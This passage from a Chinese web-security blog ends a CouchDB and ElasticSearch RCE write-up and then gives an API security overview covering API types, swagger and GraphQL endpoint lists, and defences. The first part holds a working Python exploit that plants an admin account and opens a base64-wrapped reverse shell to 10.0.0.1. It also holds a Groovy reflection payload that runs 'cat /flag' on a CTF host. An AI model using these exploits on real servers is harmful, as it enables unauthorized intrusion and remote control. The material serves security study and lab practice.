class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://your-ip:5984&#x27;</span></span><br><span class="line">command = <span class="string">rb&quot;&quot;&quot;sh -i &gt;&amp; /dev/tcp/10.0.0.1/443 0&gt;&amp;1&quot;&quot;&quot;</span></span><br><span class="line">version = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># session.proxies = &#123;</span></span><br><span class="line"><span class="comment">#     &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line">session.put(target + <span class="string">&#x27;/_users/org.couchdb.user:wooyun&#x27;</span>, data=<span class="string">&#x27;&#x27;&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;type&quot;: &quot;user&quot;,</span></span><br><span class="line"><span class="string">  &quot;name&quot;: &quot;wooyun&quot;,</span></span><br><span class="line"><span class="string">  &quot;roles&quot;: [&quot;_admin&quot;],</span></span><br><span class="line"><span class="string">  &quot;roles&quot;: [],</span></span><br><span class="line"><span class="string">  &quot;password&quot;: &quot;wooyun&quot;</span></span><br><span class="line"><span class="string">&#125;&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">session.auth = HTTPBasicAuth(<span class="string">&#x27;wooyun&#x27;</span>, <span class="string">&#x27;wooyun&#x27;</span>)</span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;bash -c &#x27;&#123;echo,%s&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&quot;</span> % base64.b64encode(command).decode()</span><br><span class="line"><span class="keyword">if</span> version == <span class="number">1</span>:</span><br><span class="line">    session.put(target + (<span class="string">&#x27;/_config/query_servers/cmd&#x27;</span>), data=json.dumps(command))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    host = session.get(target + <span class="string">&#x27;/_membership&#x27;</span>).json()[<span class="string">&#x27;all_nodes&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">    session.put(target + <span class="string">&#x27;/_node/&#123;&#125;/_config/query_servers/cmd&#x27;</span>.<span class="built_in">format</span>(host), data=json.dumps(command))</span><br><span class="line"></span><br><span class="line">session.put(target + <span class="string">&#x27;/wooyun&#x27;</span>)</span><br><span class="line">session.put(target + <span class="string">&#x27;/wooyun/test&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;_id&quot;: &quot;wooyuntest&quot;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> version == <span class="number">1</span>:</span><br><span class="line">    session.post(target + <span class="string">&#x27;/wooyun/_temp_view?limit=10&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    session.put(target + <span class="string">&#x27;/wooyun/_design/test&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>具体来分析下上面的漏洞，可以总结为以下步骤：</p><h4 id="1-修改-query-servers-配置"><a href="#1-修改-query-servers-配置" class="headerlink" title="1. 修改 query_servers 配置"></a>1. 修改 <code>query_servers</code> 配置</h4><ul><li>攻击者首先将 <code>query_servers</code> 中用于处理命令的处理器（如 <code>cmd</code>）设置为执行任意命令的脚本或命令。例如，通过以下请求：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT &#x27;http://username:password@your-ip:5984/_config/query_servers/cmd&#x27; -d &#x27;&quot;id &gt;/tmp/success&quot;&#x27;</span><br></pre></td></tr></table></figure>这里，<code>username:password</code> 是已知的管理员凭据，<code>your-ip</code> 是目标 CouchDB 服务器的 IP 地址。</li></ul><h4 id="2-触发命令执行"><a href="#2-触发命令执行" class="headerlink" title="2. 触发命令执行"></a>2. 触发命令执行</h4><ul><li>然后，攻击者创建一个新的数据库和文档，为触发命令执行做准备。创建数据库和文档的请求不包含任何恶意代码，它们仅仅是为了后续的查询操作做准备。</li><li>最后，攻击者通过创建一个特殊的视图（在 CouchDB 2.x 中是 <code>_design</code> 文档）触发命令执行。视图的 <code>language</code> 属性被设置为 <code>cmd</code>，这告诉 CouchDB 使用 <code>cmd</code> 处理器来解释和执行视图的 Map 函数，而 Map 函数实际上是被配置为执行任意命令的脚本。</li></ul><h4 id="CouchDB-1-x-和-2-x-的区别"><a href="#CouchDB-1-x-和-2-x-的区别" class="headerlink" title="CouchDB 1.x 和 2.x 的区别"></a>CouchDB 1.x 和 2.x 的区别</h4><ul><li>在 CouchDB 2.x 中，由于引入了集群模式，修改配置的 API 需要包括节点名称。攻击者首先需要查询节点名称，然后针对特定节点修改 <code>query_servers</code> 配置。</li><li>CouchDB 2.x 中删除了 <code>_temp_view</code>，所以需要通过创建永久视图来触发命令执行。</li></ul><h2 id="ElasticSearch-文件写入-RCE-漏洞"><a href="#ElasticSearch-文件写入-RCE-漏洞" class="headerlink" title="ElasticSearch-文件写入&amp;RCE-漏洞"></a>ElasticSearch-文件写入&amp;RCE-漏洞</h2><p><a href="https://www.cnblogs.com/cute-puli/p/15359890.html">https://www.cnblogs.com/cute-puli/p/15359890.html</a></p><p>1.5.x以前（其实跟CVE-2015-5531-ElasticSearch 目录穿越是差不多类型的漏洞，相当于是利用该漏洞来getshell吧）<br>访问存在的漏洞页面：（9200一般为ElasticSearch的常用端口），此漏洞环境需要与tomcat结合使用，发现8080端口存在tomcat默认配置页面。发现9200端口存在elasticsearch页面：<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-11.png"><br>看到elasticSearch的版本为1.4.1猜测可能存在rce漏洞，打开burpsuite ，开启代理抓取数据包并把数据包并把数据包放到重放器中。<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-12.png"><br>由于查询时至少要求ElasticSearch中有一条数据，所以替换如下数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /website/blog/ HTTP/1.1</span><br><span class="line">Host: eci-2ze6p6jlhlj2syghya9p.cloudeci1.ichunqiu.com:9200</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.43</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 26</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;: &quot;test&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-13.png"><br>利用反射机制执行JAVA代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /_search?pretty HTTP/1.1</span><br><span class="line">Host: eci-2ze6p6jlhlj2syghya9p.cloudeci1.ichunqiu.com:9200</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.43</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/text</span><br><span class="line">Content-Length: 500</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;size&quot;:1,</span><br><span class="line">&quot;script_fields&quot;: &#123;</span><br><span class="line">&quot;test#&quot;: &#123;</span><br><span class="line">&quot;script&quot;:&quot;java.lang.Math.class.forName(\&quot;java.io.BufferedReader\&quot;).getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\&quot;java.io.InputStreamReader\&quot;).getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;cat /flag\&quot;).getInputStream())).readLines()&quot;,</span><br><span class="line">&quot;lang&quot;: &quot;groovy&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-14.png"><br>看到有加密过的文件猜测可能是base64编码，用burpsuite自带的解码工具尝试<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-15.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【web安全】API安全知识整理</title>
      <link href="/2024/09/27/WebSecurity/owasptop/apisecurity/"/>
      <url>/2024/09/27/WebSecurity/owasptop/apisecurity/</url>
      
        <content type="html"><![CDATA[<p>API 安全基本现状 <a href="https://www.akamai.com/site/zh/documents/white-paper/2024/api-security-fundamentals.pdf">https://www.akamai.com/site/zh/documents/white-paper/2024/api-security-fundamentals.pdf</a><br>OWASP API Security TOP 10中文项目 2023 <a href="http://www.owasp.org.cn/OWASP-CHINA/owasp-project/owasp-api-security-top-104e2d6587987976ee/OWASP-API%E5%AE%89%E5%85%A8Top10-2023-v1-0818.pdf">http://www.owasp.org.cn/OWASP-CHINA/owasp-project/owasp-api-security-top-104e2d6587987976ee/OWASP-API%E5%AE%89%E5%85%A8Top10-2023-v1-0818.pdf</a><br>OWASP 十大 API 安全风险：2023 年版终于问世 <a href="https://www.akamai.com/zh/blog/security/owasp-top-10-api-security-risks-2023-edition">https://www.akamai.com/zh/blog/security/owasp-top-10-api-security-risks-2023-edition</a><br>API 安全策略和基础指南 <a href="https://xie.infoq.cn/article/fb0ed41639922d2aa90befb97">https://xie.infoq.cn/article/fb0ed41639922d2aa90befb97</a><br>正确甄别API、REST API、RESTful API和Web Service之间的异同 <a href="https://cloud.tencent.com/developer/article/1448167">https://cloud.tencent.com/developer/article/1448167</a><br>浅析接口安全之WebService <a href="https://xz.aliyun.com/t/7541">https://xz.aliyun.com/t/7541</a><br>菜鸟教程wsdl <a href="https://www.runoob.com/wsdl/wsdl-summary.html">https://www.runoob.com/wsdl/wsdl-summary.html</a><br><strong>SOAP协议安全攻防录</strong> <a href="https://xz.aliyun.com/t/13285">https://xz.aliyun.com/t/13285</a><br>SOAP最全Web Service渗透测试总结 <a href="https://blog.csdn.net/weixin_50464560/article/details/125022377">https://blog.csdn.net/weixin_50464560/article/details/125022377</a><br>Graphql接口安全问题浅析 <a href="https://xz.aliyun.com/t/13733">https://xz.aliyun.com/t/13733</a><br><strong>【翻译】GraphQL API 漏洞的常见攻击方法总结</strong> <a href="https://xz.aliyun.com/t/14913">https://xz.aliyun.com/t/14913</a><br>GraphQL安全指北 <a href="https://www.freebuf.com/articles/web/184040.html">https://www.freebuf.com/articles/web/184040.html</a></p><p><a href="https://salt.security/">https://salt.security/</a></p><p>Book：API安全实战、API安全技术与实战</p><h2 id="类别"><a href="#类别" class="headerlink" title="类别"></a>类别</h2><p><img src="/2024/09/27/WebSecurity/owasptop/apisecurity/image-1.png"></p><table><thead><tr><th>使用模式</th><th>说明</th></tr></thead><tbody><tr><td>HTTP API</td><td>这类 API 使用超文本传输协议作为 API 调用的通信协议。</td></tr><tr><td>RESTful API</td><td>表现层状态转换 (RESTful) 可追溯到 Roy Fielding 2000 年的博士论文，是最常见的 Web API 类型，通常使用 JSON（JavaScript 对象表示法）来存储数据。RESTful API 易于供现代前端框架（例如 React 和 React Native）使用</td></tr><tr><td>GraphQL API</td><td>GraphQL 是一种用于 API 的查询语言，它允许客户端以声明的方式定义请求的数据，而不需要了解服务端如何返回数据。GraphQL API 允许客户端在单个请求中同时获取多个资源，从而减少网络请求的数量，并使客户端可以更轻松地使用</td></tr><tr><td>SOAP</td><td>SOAP 使用详细的可扩展标记语言 (XML) 进行远程过程调用(RPC)。</td></tr><tr><td>XML-RPC</td><td>XML-RPC 是通过互联网进行过程调用的一种方法，使用 XML进行编码并用 HTTP 作为通信协议。</td></tr><tr><td>gRPC</td><td>gRPC API 是 Google 开发的 HTTP&#x2F;2.0 高性能二进制协议，主要用于东西向通信。</td></tr><tr><td>OpenAPI</td><td>OpenAPI 是 API 的一种描述和文档规范。在旧版本中，OpenAPI 被称为 Swagger，两种说法现在仍然经常混淆使用。</td></tr></tbody></table><p>什么是南北向 API？<br>这些 API 是企业供外界访问的 API，主要用于与业务合作伙伴开展业务。这种情况称为 API 开放。例如，支持开放银行业务的银行可能通过 API 向其他金融科技企业或金融服务企业开放其帐户。医疗保健企业可能通过 API 向保险公司和其他医疗企业开放患者记录。南北向 API 通常被认为是安全的，因为 API 访问已获得授权并已经过身份验证。这些 API 通常增长极快且数量庞大，因此对大多数企业而言是很大的攻击面。<br>什么是东西向 API？<br>这些 API 是企业内部使用的 API，企业外部的任何人都不应访问。这些 API 连接内部应用程序，或者连接业务单位或部门。<br><img src="/2024/09/27/WebSecurity/owasptop/apisecurity/image.png"></p><h2 id="API安全问题"><a href="#API安全问题" class="headerlink" title="API安全问题"></a>API安全问题</h2><p><img src="/2024/09/27/WebSecurity/owasptop/apisecurity/image-3.png"></p><ul><li>漏洞利用：底层基础架构中的技术漏洞可能会导致服务器受损。此类漏洞的例子很多，从 Apache Struts 漏洞（CVE-2017-9791、CVE-2018-11776 等）到 Log4j 漏洞（CVE-2021-44228 等）都包括在内。</li><li>业务逻辑滥用：这些可怕的场景时常让首席信息安全官 (CISO) 彻夜难眠，因为传统的安全控制措施对此毫无用处。逻辑滥用是指攻击者利用应用程序设计或实施的缺陷来引发意外行为和未经批准的行为。</li><li>未经授权的数据访问：API 滥用的另一种常见形式是攻击者利用失效的授权机制来访问其无权访问的数据。这些漏洞有很多名称，例如失效的对象级授权 (BOLA)、不安全的直接对象引用 (IDOR)，以及失效的功能级授权 (BFLA)。最新的漏洞列表可以在OWASP API 安全项目网站上查看。</li><li>帐户接管：在凭据被盗乃至 XSS 攻击之后，帐户可能会被接管。一旦发生这种情况，即使是编写得最好、安全性最高的 API 也可能被滥用。毕竟，如果不执行行为分析，任何经过身份验证的活动都被视为合法使用。</li><li>数据抓取：如果企业通过公共 API 提供数据集，攻击者就可能积极查询这些资源，以便批量捕获大体量、有价值的数据集。</li><li>业务拒绝服务 (DoS)：API 攻击者如果请求后端执行繁重任务，可能引发应用程序层的“服务侵蚀”或完全拒绝服务（GraphQL 中十分常见的一个漏洞，但任何资源密集型 API 端点实施都可能发生这种情况）。</li></ul><p>可以使用postman进行测试，优点是方便，种类齐全：<a href="https://www.postman.com/downloads/">https://www.postman.com/downloads/</a><br>针对API的安全问题测试和普通的web安全没有什么区别，只是攻击载荷需要满足特定的要求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url很多时候就会有特征</span><br><span class="line">/api/openapi.json</span><br><span class="line">/api/v2/swagger.json</span><br><span class="line">/api/v1/swagger.yaml</span><br></pre></td></tr></table></figure><h2 id="Web-Service-API"><a href="#Web-Service-API" class="headerlink" title="Web Service API"></a>Web Service API</h2><p><a href="https://cloud.tencent.com/developer/article/1666998">https://cloud.tencent.com/developer/article/1666998</a><br>WSDL（Web Services Description Language）即网络服务描述语言，用于描述Web 服务的公共接口。这是一个基于 XML 的关于如何与 Web 服务通讯和使用的服务描述；也就是描述与目录中列出的 Web 服务进行交互时需要绑定的协议和信息格式。通常采用抽象语言描述该服务支持的操作和信息，使用的时候再将实际的网络协议和信息格式绑定给该服务。SOAP、REST其实也都是Web Service API<br>wsdl是一个xml，用于说明soap消息及如何使用这些消息，通常形式为asmx?wsdl<br>查询语法：inurl:(_vti_bin | api | webservice | ws | ?wsdl )&#96;，探测诸如“.dll?wsdl”、“.ashx?wsdl”、“.exe?wsdl”或者“.php?wsdl”等等的Web Service地址。</p><p>利用工具：SoapUI、ReadyAPI，这两个都是导入相应的api文档后自动化生成测试用例进行安全测试，Burpsuite的WSDLer插件<br><img src="/2024/09/27/WebSecurity/owasptop/apisecurity/image-4.png"><br><img src="/2024/09/27/WebSecurity/owasptop/apisecurity/image-5.png"></p><h3 id="SOAP-安全"><a href="#SOAP-安全" class="headerlink" title="SOAP 安全"></a>SOAP 安全</h3><p>SOAP（Simple Object Access Protocol）简单对象访问协议是交换数据的一种协议规范，是一种轻量的、简单的、基于 XML（标准通用标记语言下的一个子集）的协议，它被设计成在 WEB 上交换结构化的和固化的信息。SOAP 不是 Web Service 的专有协议。SOAP 使用 HTTP 来发送 XML 格式的数据，可以简单理解为：SOAP &#x3D; HTTP +XML<br>探针：目录&amp;JS 资源<br>利用：SoapUI&amp;EXP<br><a href="https://github.com/lijiejie/swagger-exp">https://github.com/lijiejie/swagger-exp</a><br><a href="https://github.com/jayus0821/swagger-hack">https://github.com/jayus0821/swagger-hack</a><br>特征指纹：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/swagger</span><br><span class="line">/api/swagger</span><br><span class="line">/swagger/ui</span><br><span class="line">/api/swagger/ui</span><br><span class="line">/swagger-ui.html</span><br><span class="line">/api/swagger-ui.html</span><br><span class="line">/user/swagger-ui.html</span><br><span class="line">/libs/swaggerui</span><br><span class="line">/api/swaggerui</span><br><span class="line">/swagger-resources/configuration/ui</span><br><span class="line">/swagger-resources/configuration/security</span><br><span class="line"></span><br><span class="line">Swagger接口漏洞测试类型</span><br><span class="line">接口越权</span><br><span class="line">接口SQL注入（针对所有查询接口）</span><br><span class="line">接口未授权访问（重点针对管理员模块，如对用户的增删改查）</span><br><span class="line">任意文件上传（针对上传接口进行测试）</span><br><span class="line">测试信息泄露（重点针对用户、订单等信息查询接口，以及一些测试数据等）</span><br></pre></td></tr></table></figure><h3 id="REST-API-安全"><a href="#REST-API-安全" class="headerlink" title="REST API 安全"></a>REST API 安全</h3><p>REST（Representational State Transfer）即表述性状态传递，在三种主流的Web 服务实现方案中，因为 REST 模式的 Web 服务与复杂的 SOAP 和 XML-RPC 对比来讲明显的更加简洁，越来越多的 Web 服务开始采用 REST 风格设计和实现。例如，Amazon.com 提供接近 REST 风格的 Web 服务进行图书查找；雅虎提供的 Web 服务也是REST 风格的。</p><p>Astra：针对REST API的自动化安全测试工具 <a href="https://www.freebuf.com/sectool/232503.html">https://www.freebuf.com/sectool/232503.html</a></p><h2 id="HTTP-API"><a href="#HTTP-API" class="headerlink" title="HTTP API"></a>HTTP API</h2><p>webpack是一个前端的模块化打包(构建)的工具，webpack将一切繁杂的、重复的、机械的工作自动处理，开发者只需要关注于功能的实现的<br>探针：插件&amp;JS 资源<br>利用：PackerFuzzer<br><a href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a><br>可以使用wapplyzer帮助识别网站是否是由webpack构建<br><img src="/2024/09/27/WebSecurity/owasptop/apisecurity/image-6.png"><br>如果看到有很多.js文件之类的，还有webpack就有可能是了<br><img src="/2024/09/27/WebSecurity/owasptop/apisecurity/image-7.png"></p><h2 id="GraphQL-安全"><a href="#GraphQL-安全" class="headerlink" title="GraphQL 安全"></a>GraphQL 安全</h2><p>GraphQL是一种API查询语言，是为了促进客户端和服务器之间的高效通信。从这个单词上看，感觉和SQL的区别就在于语句结构吧，术业有专攻，GraphQL是用来查询API的。它使用户能够准确指定他们想要在响应中包含哪些数据，从而有助于避免有时在REST API中出现的大型响应对象和多次调用，这个应该是防止返回意外的数据。<br>GraphQL服务定义了一个合约，客户端可以通过该合约与服务器进行通信。客户端不需要知道数据保存在哪里。相反，客户端将查询发送到GraphQL服务器，该服务器从相关位置获取数据。由于GraphQL与平台无关，因此它可以使用多种编程语言来实现，并且可用于与几乎任何数据库进行通信。</p><p>GraphQL查询是从数据存储中检索数据。它们大致相当于REST API中的GET请求。查询通常具有以下关键组成部分：</p><ul><li>一个查询操作类型。这项是可选的，但是一般建议还是选，因为它明确告诉服务器传入的请求是一次查询。</li><li>查询名称。就是给你的查询起个名字，也是可选的，但是一般建议还是选，因为它可以方便我们调试。</li><li>一种数据结构。这是查询应返回的数据。</li><li>可选的一个或多个参数。它们用于创建返回特定对象详细信息的查询(例如”给我ID为123的产品的名称和描述”)</li></ul><p>下面的示例显示了一个名为myGetProductQuery的查询，该查询请求获取id为123产品的名称和描述字段：</p><figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">query</span> myGetProductQuery <span class="punctuation">&#123;</span></span><br><span class="line">    getProduct<span class="punctuation">(</span><span class="symbol">id</span><span class="punctuation">:</span> <span class="number">123</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span></span><br><span class="line">        name</span><br><span class="line">        description</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>变更，顾名思义，就是变更，增删改都属于变更的范畴。大致相当于REST API的POST、PUT和DELETE方法。与查询一样，变更也具有返回数据的操作类型、名称和结构。然而，变更总是需要某种类型的输入。可以是内联值，但实际上通常作为变量引入。<br>下面的示例显示了创建新产品的变更及其相关响应。在这种情况下，该服务被配置为自动为已按请求返回的新产品分配ID：</p><figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mutation</span> <span class="punctuation">&#123;</span></span><br><span class="line">    createProduct<span class="punctuation">(</span><span class="symbol">name</span><span class="punctuation">:</span> <span class="string">&quot;Flamin&#x27; Cocktail Glasses&quot;</span>, <span class="symbol">listed</span><span class="punctuation">:</span> <span class="string">&quot;yes&quot;</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span></span><br><span class="line">        id</span><br><span class="line">        name</span><br><span class="line">        listed</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="string">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="string">&quot;createProduct&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="string">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">123</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Flamin&#x27; Cocktail Glasses&quot;</span>,</span><br><span class="line">            <span class="string">&quot;listed&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yes&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>如果我们将query{__typename}发送到任何GraphQL端点，它将在其响应中的某处包含字符串<code>&#123;&quot;data&quot;: &#123;&quot;__typename&quot;: &quot;query&quot;&#125;&#125;</code>。这称为通用查询，是探测URL是否对应于GraphQL服务的有用工具。该查询之所以有效，是因为每个GraphQL端点都有一个名为__typename的保留字段，该字段以字符串形式返回查询对象的类型。可能存在的探测接口如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/graphql</span><br><span class="line">/api</span><br><span class="line">/api/graphql</span><br><span class="line">/graphql/api</span><br><span class="line">/graphql/graphql</span><br></pre></td></tr></table></figure><p>如果这些常见端点不返回GraphQL响应，我们还可以尝试&#x2F;v1附加到路径。我们应该牢记一个知识点，就是GraphQL服务通常会响应任何非GraphQL请求，并显示”查询不存在”或类似错误。</p><p>5个最常见的GraphQL安全漏洞 <a href="https://zhuanlan.zhihu.com/p/554808001">https://zhuanlan.zhihu.com/p/554808001</a></p><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p><a href="https://github.com/snoopysecurity/dvws-node">https://github.com/snoopysecurity/dvws-node</a></p><h2 id="API安全防护视角"><a href="#API安全防护视角" class="headerlink" title="API安全防护视角"></a>API安全防护视角</h2><p><img src="/2024/09/27/WebSecurity/owasptop/apisecurity/image-2.png"></p><ul><li>设法将 API 安全防护标准和实践整合到企业的软件开发生命周期中</li><li>将 API 文档和自动化安全测试纳入持续集成&#x2F;持续交付 (CI&#x2F;CD) 管道</li><li>确保对 API 应用适当且有效的身份验证和授权控制</li><li>实施速率限制措施，帮助防止 API 滥用或崩溃</li><li>使用专用网关和&#x2F;或内容交付网络增强速率限制和其他应用程序级措施，以抵御分布式拒绝服务 (DDoS) 攻击</li><li>让 API 安全防护测试成为更大范围的应用程序测试流程中不可或缺的一部分</li><li>执行持续的 API 发现</li><li>实施系统化的方法来识别和修复常见 API 漏洞，包括OWASP 十大 API 安全风险</li><li>使用基于签名的威胁检测和预防，作为针对已知 API 攻击的基准级防护</li><li>利用 AI 和行为分析来增强基于签名的检测，使 API 威胁检测的扩展性、准确性和业务相关性更强，并且能够抵御新型威胁</li><li>确保 API 安全监控和分析持续数周并覆盖多个 API 会话</li><li>作为对 API 安全监控和告警的补充，为威胁搜寻人员、开发人员、DevOps 和支持人员提供对 API 清单和活动数据的按需访问权限</li></ul><p>API 安全防护解决方案包含哪些内容？</p><ul><li>身份验证和授权： API 安全防护解决方案涉及对访问 API 的用户进行身份验证和授权，确保只有已获得授权的用户才能访问和操作数据。身份验证方法包括多重身份验证、OAuth、OpenID Connect 和 API 密钥，而授权方法包括基于角色的访问控制和基于属性的访问控制。</li><li>API 网关： API 网关作为所有 API 请求的入口点，是综合性 API 安全防护解决方案的组成部分。网关可以执行多种功能，包括身份验证、速率限制、流量管理和缓存，并且有助于防止分布式拒绝服务 (DDoS) 等攻击。</li><li>加密： API 安全防护解决方案还涉及加密，用于保护通过 API 传输的数据的安全，确保攻击者无法拦截数据。加密技术包括 SSL、TLS 和 AES 加密，可用于加密 API 请求、响应和静态数据。</li><li>速率限制： 速率限制是 API 安全防护解决方案的一项功能，通过限制用户在指定时间段内可以发出的请求数量，来帮助防止拒绝服务攻击。速率限制可以按不同的 IP 地址、用户帐户或其他参数来设置，有助于防止攻击者用大量请求淹没 API。</li><li>审计和日志记录： API 安全防护解决方案还应包括审计和日志记录，通过监测 API 活动来帮助检测和抵御安全威胁。审计涉及跟踪 API 